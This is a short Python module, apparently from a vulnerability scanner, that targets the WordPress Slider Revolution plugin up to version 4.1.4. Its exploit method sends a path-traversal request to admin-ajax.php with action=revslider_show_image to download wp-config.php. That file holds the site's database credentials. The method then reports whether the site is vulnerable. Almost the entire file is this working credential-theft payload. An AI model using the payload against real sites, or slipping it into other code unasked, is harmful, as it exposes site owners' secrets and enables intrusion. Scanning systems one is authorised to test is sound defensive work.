from exploits.exploitafd import ExploitAfd


class SliderRevolution(ExploitAfd):
    exploit_info = {
        'exploit_name': 'Wordpress Plugin Slider Revolution',
        'exploit_version': '<= 4.1.4',
        'exploit_url': 'http://www.exploit-db.com/exploits/36554/'
    }

    def exploit(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'
        }
        url = self.hostname + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
        response = self.request(url, headers=headers)

        if response is None or 'error' in response or response == '0':
            self.exploitnotfound(self.exploit_info)
        else:
            self.exploitfound(self.exploit_info)
